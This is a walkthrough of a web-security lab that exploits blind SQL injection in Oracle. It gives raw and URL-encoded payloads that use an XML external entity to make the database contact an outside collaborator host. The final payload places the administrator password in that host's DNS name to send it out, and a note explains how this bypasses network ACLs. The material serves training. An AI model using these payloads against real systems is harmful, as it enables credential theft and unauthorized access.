# Blind SQL injection with out-of-band data exfiltration

*A clean, step‑by‑step write‑up using my original flow and **raw payloads** (left as written), plus short notes on XML entities and Oracle behavior.*

---

## 🎯 Goal
**Extract the `administrator` password via out‑of‑band (OOB) DNS and log in.**

> For labs/authorized testing only.

---

## ✅ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** extract administrator password via OOB blind sqli
2. We already know this has the default DB structure of table named **`users`** with two columns **`username`** and **`password`**.
3. Since we're dealing with blind sqli, on a black‑boxed lab, it can take a very long time. In day‑to‑day PT, we’ll use the internet.
4. Here we have the SQLi cheat sheet: <https://portswigger.net/web-security/sql-injection/cheat-sheet>
5. Scrolling down, grab the following **Oracle** payload:
   ```sql
   SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
   ```
6. Blindly try to get a **DNS request** with Burp Collaborator. *Note:* sites like **interact.sh** might not get your request due to PortSwigger blocking those requests.
7. Add the breaking point `'` and comment at the end with `+--+`.
8. Add **UNION** since we can’t just use a simple `SELECT`.
9. Raw attempt:
   ```
   ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual+--+
   ```
10. At this point note that if you **encode the whole payload**, signs like `+` will get **double‑encoded**, and the payload won’t be stable in decoding.
11. Remove `+` and make spaces so once I encode everything I get a normal encoded injection payload.
12. Encoded‑string version I used:
    ```
    '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//1rt2jjv3brup3hasr9keqt8tkkqbe12q.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual+--
    ```
13. Now, after I got the **DNS** request (screenshot 1), I know my way of getting the password is **attaching the password** to the subdomain.
14. In Oracle we have `||` as **concatenation**. It should look like:
    ```
    ||(SELECT password from user WHERE username='administrator')||
    ```
15. Payload attempt:
    ```
    '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//||(SELECT password from user WHERE username='administrator')||.1rt2jjv3brup3hasr9keqt8tkkqbe12q.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual+--
    ```
16. Didn’t work. I had a **typo** in the table name (`user` vs `users`). But it **still** didn’t work.
17. Realized I’m **breaking string literals**. Meaning the XML string `'... "<%3fxml ..."` must be closed **before** inserting concatenation.
18. So `||(SELECT password from user WHERE username='administrator')||` becomes:
    ```
    '||(SELECT password from user WHERE username='administrator')||'
    ```
19. **Final query** (with `users` corrected and proper string concatenation):
    ```
    '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+WHERE+username%3d'administrator')||'.1rt2jjv3brup3hasr9keqt8tkkqbe12q.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual+--
    ```
20. **Log in** as the administrator.
21. **Lab solved!** ✅

---

## 🧠 How it works (Oracle XML, entities, and OOB)
- **XMLTYPE + EXTRACTVALUE**: Calling `XMLTYPE('<xml here>')` parses the XML. `EXTRACTVALUE(..., '/l')` runs a (mostly irrelevant) XPath to “use” the document; the important part is **parsing**.
- **External entities**: In the `<!DOCTYPE ...>` you declare **parameter entity** `%remote` with `SYSTEM "http://<your-collab>/"`. When `%remote;` is **expanded**, Oracle’s XML parser **fetches** that URL → triggers **DNS + HTTP** to your domain (OOB signal).
- **Why UNION**: In many sinks, a lone `SELECT` won’t fit the original query. `UNION SELECT <scalar>` is a common way to splice your expression into the existing statement.
- **Why HTTPS failed**: TLS/ACL/cert constraints often block HTTPS; **HTTP** is more likely to work in labs. DNS resolution still happens, but the parser may not proceed over HTTPS failures.
- **String concatenation pitfalls**: Your XML string must stay a **valid quoted literal**. To splice dynamic content (like a password) into the URL, you must **close the string**, `||` your subquery, then **reopen** the string literal. That was the key correction in the final payload.
- **EXTRACTVALUE** deprecation: Later Oracle versions deprecate `EXTRACTVALUE`; alternatives like `XMLQuery`/`XMLExists` still parse XML and can trigger external entity fetches when expansion is enabled.
- **Permissions/ACL**: Built‑in network packages (`UTL_HTTP`, `UTL_INADDR`, etc.) are usually restricted. The XXE path sometimes bypasses those **ACL** gates — which is why this trick works in many labs.

> Guardrail: Always have explicit permission. XXE‑style OOB can reach sensitive network paths (IMDS, internal hosts). Keep targets to your Collaborator domain only.

---

## ⌨️ Raw payloads I used (kept exactly)
```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual+--+
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//1rt2jjv3brup3hasr9keqt8tkkqbe12q.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual+--
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+WHERE+username%3d'administrator')||'.1rt2jjv3brup3hasr9keqt8tkkqbe12q.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual+--
```

---

## 🏁 Result
- Confirmed OOB via **DNS/HTTP** with the XML entity trick, then **exfiltrated the password** inside the request hostname using `||` + subquery. Logged in as **administrator**. **Solved. ✅**
